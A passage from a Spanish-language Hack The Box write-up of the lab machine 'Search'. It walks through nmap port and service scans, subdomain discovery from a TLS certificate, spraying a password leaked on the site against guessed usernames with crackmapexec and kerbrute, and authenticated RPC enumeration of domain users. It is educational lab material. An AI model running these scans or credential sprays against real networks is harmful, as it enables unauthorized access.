  <li>Comenzamos escaneando puertos y viendo sus tecnologías que corren en los puertos abiertos por el protocolo <code class="language-plaintext highlighter-rouge">TCP</code>.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Parámetro</th>
      <th>Uso</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p-</td>
      <td>Escanear todo el rango de puertos (65535) por el protocolo TCP.</td>
    </tr>
    <tr>
      <td>–open</td>
      <td>Solo queremos ver puertos abiertos.</td>
    </tr>
    <tr>
      <td>-sS</td>
      <td>TCP SYN Stealth, Nmap realiza un escaneo de tipo SYN, envía paquetes SYN (Synchronize) a los puertos de destinosi recibe un paquete SYN/ACK (Synchronize/Acknowledge), esto indica que el puerto está abierto. Si recibe un paquete RST (Reset), significa que el puerto está cerrado. Esta técnica es útil porque puede ayudar a evadir ciertos tipos de firewalls.</td>
    </tr>
    <tr>
      <td>–min-rate 5000</td>
      <td>Vamos a emitir al menos 5000 paquetes por segundo para ir mucho mas rápido.</td>
    </tr>
    <tr>
      <td>-vvv</td>
      <td>Para que nos reporte los puertos que vaya encontrando por la consola.</td>
    </tr>
    <tr>
      <td>-n</td>
      <td>Para que no aplique resolución DNS.</td>
    </tr>
    <tr>
      <td>-Pn</td>
      <td>Esto es para indicarle que omita el descubrimiento de hosts.</td>
    </tr>
    <tr>
      <td>-oG</td>
      <td>Para exportar la salida en formato Greppable.</td>
    </tr>
  </tbody>
</table>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.229.57 <span class="nt">-oG</span> allPorts
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-07 14:28 CST
Initiating SYN Stealth Scan at 14:28
Scanning 10.129.229.57 <span class="o">[</span>65535 ports]
Discovered open port 139/tcp on 10.129.229.57
Discovered open port 135/tcp on 10.129.229.57
Discovered open port 80/tcp on 10.129.229.57
Discovered open port 53/tcp on 10.129.229.57
Discovered open port 445/tcp on 10.129.229.57
Discovered open port 443/tcp on 10.129.229.57
Discovered open port 9389/tcp on 10.129.229.57
Discovered open port 49724/tcp on 10.129.229.57
Discovered open port 3269/tcp on 10.129.229.57
Discovered open port 8172/tcp on 10.129.229.57
Discovered open port 49699/tcp on 10.129.229.57
Discovered open port 3268/tcp on 10.129.229.57
Discovered open port 49692/tcp on 10.129.229.57
Discovered open port 464/tcp on 10.129.229.57
Discovered open port 389/tcp on 10.129.229.57
Increasing send delay <span class="k">for </span>10.129.229.57 from 0 to 5 due to 12 out of 38 dropped probes since last increase.
Discovered open port 88/tcp on 10.129.229.57
Increasing send delay <span class="k">for </span>10.129.229.57 from 5 to 10 due to 11 out of 20 dropped probes since last increase.
Completed SYN Stealth Scan at 14:29, 67.08s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.129.229.57
Host is up, received user-set <span class="o">(</span>0.44s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2024-04-07 14:28:44 CST <span class="k">for </span>67s
Not shown: 65519 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
8172/tcp  open  unknown          syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49692/tcp open  unknown          syn-ack ttl 127
49699/tcp open  unknown          syn-ack ttl 127
49724/tcp open  unknown          syn-ack ttl 127
</code></pre></div></div>

<ul>
  <li>Ahora usamos la función <code class="language-plaintext highlighter-rouge">extractPorts</code> para copear los puertos abiertos a la <code class="language-plaintext highlighter-rouge">clipboard</code> y escanear los servicios que corren en los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap which extractPorts
extractPorts <span class="o">()</span> <span class="o">{</span>
	<span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span><span class="s2">"</span>
	<span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="si">)</span><span class="s2">"</span>
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Extracting information...</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> extractPorts.tmp
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Open ports: </span><span class="nv">$ports</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
	<span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[*] Ports copied to clipboard</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
	<span class="nb">cat </span>extractPorts.tmp
	<span class="nb">rm </span>extractPorts.tmp
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>La ejecutamos y nos copea los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap extractPorts allPorts

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...

	<span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.129.229.57
	<span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 53,80,88,135,139,389,443,445,464,3268,3269,8172,9389,49692,49699,49724

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<ul>
  <li>Ahora seguimos con el escaneo de los servicios de los puertos abiertos.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Uso</th>
      <th>Párametro</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Que nos reporte las tecnologías y servicios que están corriendo en los puertos abiertos.</td>
      <td>-sCV</td>
    </tr>
    <tr>
      <td>Que no lo exporte a un archivo normal.</td>
      <td>-oN</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>Y listo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,443,445,464,3268,3269,8172,9389,49692,49699,49724 10.129.229.57 <span class="nt">-oN</span> targeted
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-07 14:48 CST
Nmap scan report <span class="k">for </span>10.129.229.57
Host is up <span class="o">(</span>0.49s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &amp;mdash<span class="p">;</span> Just Testing IIS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-07 20:49:07Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-title: Search &amp;mdash<span class="p">;</span> Just Testing IIS
|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
| http-methods:
|_  Potentially risky methods: TRACE
| tls-alpn:
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
| tls-alpn:
|_  http/1.1
|_http-title: Site doesn<span class="s1">'t have a title.
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_http-server-header: Microsoft-IIS/10.0
9389/tcp  open  mc-nmf        .NET Message Framing
49692/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-04-07T20:50:03
|_  start_date: N/A
</span></code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vemos el puerto 80 abierto vamos a ver las tecnologías que se están empleando.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">229.57</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">229.57</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Email</span><span class="p">[</span><span class="n">youremail</span><span class="vi">@search</span><span class="p">.</span><span class="nf">htb</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">229.57</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">3.3</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Search</span> <span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span> <span class="no">Just</span> <span class="no">Testing</span> <span class="no">IIS</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Vemos que tenemos un posible subdominio existente en la maquina que se llama <code class="language-plaintext highlighter-rouge">search.htb</code> así que vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> en caso de que se este aplicando <code class="language-plaintext highlighter-rouge">Virtual Hosting</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.129.229.57 search.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.129.229.57 search.htb
</code></pre></div></div>

<ul>
  <li>Aquí vemos el mismo nombre si usamos <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.229.57
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Tenemos muchos puertos abiertos pero como estamos ante un Entorno de Directorio Activo podemos comenzar enumerando el servicio <code class="language-plaintext highlighter-rouge">RPC</code> para ver si podemos enumerar usuarios del dominio empleando un <code class="language-plaintext highlighter-rouge">Null Session</code> por que no disponemos de credenciales.</p>
  </li>
  <li>
    <p>No podemos enumerar.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-U</span> <span class="s2">""</span> 10.129.229.57 <span class="nt">-N</span>
rpcclient <span class="nv">$&gt;</span> enumdomusers
result was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>No encontramos nada por que necesitamos de disponer de credenciales validas pero también tenemos el puerto 443 abierto podemos inspeccionar el certificado por casi siempre encontramos información valiosa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap openssl s_client <span class="nt">-connect</span> 10.129.229.57:443
CONNECTED<span class="o">(</span>00000003<span class="o">)</span>
Can<span class="s1">'t use SSL_get_servername
depth=0 CN = research.search.htb, CN = research
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 CN = research.search.htb, CN = research
verify error:num=21:unable to verify the first certificate
verify return:1
depth=0 CN = research.search.htb, CN = research
verify return:1
---
Certificate chain
 0 s:CN = research.search.htb, CN = research
   i:DC = htb, DC = search, CN = search-RESEARCH-CA
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Aug 11 08:13:35 2020 GMT; NotAfter: Aug  9 08:13:35 2030 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
-----END CERTIFICATE-----
subject=CN = research.search.htb, CN = research
issuer=DC = htb, DC = search, CN = search-RESEARCH-CA
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA
Server Temp Key: ECDH, secp384r1, 384 bits
---
SSL handshake has read 1907 bytes and written 581 bytes
Verification error: unable to verify the first certificate
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: DD43000058B89B34DEC8D6F721AFE9AE4CD04A82C34216BE763E4ADCE3E1E92F
    Session-ID-ctx:
    Master-Key: 9DC677241F4C42AEFDA506C7334AD059E4B16040E59E07F6E820712A1E3A7B821A639EF56E7574ACD0B809159AECB46D
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1712523918
    Timeout   : 7200 (sec)
    Verify return code: 21 (unable to verify the first certificate)
    Extended master secret: yes
---
</span></code></pre></div></div>

<ul>
  <li>Encontramos un subdominio a si que vamos agregarlo al <strong>/etc/hosts</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
10.129.229.57 search.htb research.search.htb
</code></pre></div></div>

<ul>
  <li>Pero si vemos las paginas webs vemos que las 3 son los mismo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/1.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/2.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/3.png" />
</p>

<h2 id="hopesharp">hope.sharp</h2>

<ul>
  <li>Si vemos en las imágenes que nos muestran en la web hay una contraseña y un usuario básicamente un <code class="language-plaintext highlighter-rouge">Information Leakage</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/4.png" />
</p>

<ul>
  <li>Para validar si es un usuario valido vamos a hacer varios ejemplos del nombre de usuario por que no sabemos como es que lo representa a si que vamos a crear un <code class="language-plaintext highlighter-rouge">.txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>users.txt
hopesharp
h.sharp
hope.s
h.sharp
hope.sharp
H.Sharp
Hope.Sharp
</code></pre></div></div>

<ul>
  <li>Podemos hacerlo con <code class="language-plaintext highlighter-rouge">kerbrute</code> o con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.229.57 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span> <span class="nt">--continue-on-success</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\h</span>opesharp:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\h</span>.sharp:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\h</span>ope.s:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\h</span>.sharp:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\h</span>ope.sharp:IsolationIsKey?
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\H</span>ope.Sharp:IsolationIsKey?
</code></pre></div></div>

<ul>
  <li>Básicamente es el mismo usuario <code class="language-plaintext highlighter-rouge">Hope.Sharp</code> y <code class="language-plaintext highlighter-rouge">hope.sharp</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./kerbrute userenum <span class="nt">-d</span> search.htb <span class="nt">--dc</span> research.search.htb users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/07/24 - Ronnie Flathers @ropnop

2024/04/07 15:24:20 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/04/07 15:24:20 <span class="o">&gt;</span>  	research.search.htb:88

2024/04/07 15:24:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Hope.Sharp@search.htb
2024/04/07 15:24:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 hope.sharp@search.htb
2024/04/07 15:24:20 <span class="o">&gt;</span>  Done! Tested 7 usernames <span class="o">(</span>2 valid<span class="o">)</span> <span class="k">in </span>0.096 seconds
</code></pre></div></div>

<ul>
  <li>Si recordamos tenemos el <code class="language-plaintext highlighter-rouge">RPC</code> abierto y como ahora si tenemos credenciales vamos a conectarnos para enumerar usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s2">"hope.sharp%IsolationIsKey?"</span> 10.129.229.57
rpcclient <span class="nv">$&gt;</span> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Santino.Benjamin] rid:[0x4aa]
user:[Payton.Harmon] rid:[0x4ab]
user:[Trace.Ryan] rid:[0x4ac]
user:[Reginald.Morton] rid:[0x4ad]
user:[Eddie.Stevens] rid:[0x4ae]
user:[Cortez.Hickman] rid:[0x4af]
user:[Chace.Oneill] rid:[0x4b0]
user:[Abril.Suarez] rid:[0x4b1]
user:[Savanah.Velazquez] rid:[0x4b2]
user:[Antony.Russo] rid:[0x4b3]
user:[Cameron.Melendez] rid:[0x4b4]
user:[Edith.Walls] rid:[0x4b5]
user:[Lane.Wu] rid:[0x4b6]
user:[Arielle.Schultz] rid:[0x4b7]
user:[Bobby.Wolf] rid:[0x4b8]
user:[Blaine.Zavala] rid:[0x4b9]
user:[Margaret.Robinson] rid:[0x4ba]
user:[Celia.Moreno] rid:[0x4bb]
user:[Kaitlynn.Lee] rid:[0x4bc]
user:[Kyler.Arias] rid:[0x4bd]
user:[Saniyah.Roy] rid:[0x4be]
user:[Sarai.Boone] rid:[0x4bf]
user:[Jermaine.Franco] rid:[0x4c0]
user:[Alfred.Chan] rid:[0x4c1]
user:[Jamar.Holt] rid:[0x4c2]
user:[Sandra.Wolfe] rid:[0x4c3]
user:[Rene.Larson] rid:[0x4c4]
user:[Yareli.Mcintyre] rid:[0x4c5]
user:[Griffin.Maddox] rid:[0x4c6]
user:[Prince.Hobbs] rid:[0x4c7]
user:[Armando.Nash] rid:[0x4c8]
user:[Sonia.Schneider] rid:[0x4c9]
user:[Maeve.Mann] rid:[0x4ca]
user:[Lizeth.Love] rid:[0x4cb]
user:[Amare.Serrano] rid:[0x4cc]
user:[Savanah.Knox] rid:[0x4cd]
user:[Frederick.Cuevas] rid:[0x4ce]
user:[Marshall.Skinner] rid:[0x4cf]
user:[Edgar.Jacobs] rid:[0x4d0]
user:[Elisha.Watts] rid:[0x4d1]
user:[Belen.Compton] rid:[0x4d2]
user:[Amari.Mora] rid:[0x4d3]
user:[Cadence.Conner] rid:[0x4d4]
user:[Katelynn.Costa] rid:[0x4d5]
user:[Sage.Henson] rid:[0x4d6]
user:[Maren.Guzman] rid:[0x4d7]
user:[Natasha.Mayer] rid:[0x4d8]
user:[Chanel.Bell] rid:[0x4d9]
user:[Scarlett.Parks] rid:[0x4da]
user:[Eliezer.Jordan] rid:[0x4db]
user:[Dax.Santiago] rid:[0x4dc]
user:[Lillie.Saunders] rid:[0x4dd]
user:[Jayla.Roberts] rid:[0x4de]
user:[Lorelei.Huang] rid:[0x4df]
user:[Taniya.Hardy] rid:[0x4e0]
user:[Charlee.Wilkinson] rid:[0x4e1]
user:[Monique.Moreno] rid:[0x4e2]
user:[Desmond.Bonilla] rid:[0x4e3]
user:[Claudia.Sharp] rid:[0x4e4]
user:[Abbigail.Turner] rid:[0x4e5]
user:[Yaritza.Riddle] rid:[0x4e6]
user:[Tori.Mora] rid:[0x4e7]
user:[Hugo.Forbes] rid:[0x4e8]
user:[Jolie.Lee] rid:[0x4e9]
user:[German.Rice] rid:[0x4ea]
user:[Zain.Hopkins] rid:[0x4eb]
user:[Hope.Sharp] rid:[0x4ec]
user:[Kylee.Davila] rid:[0x4ed]
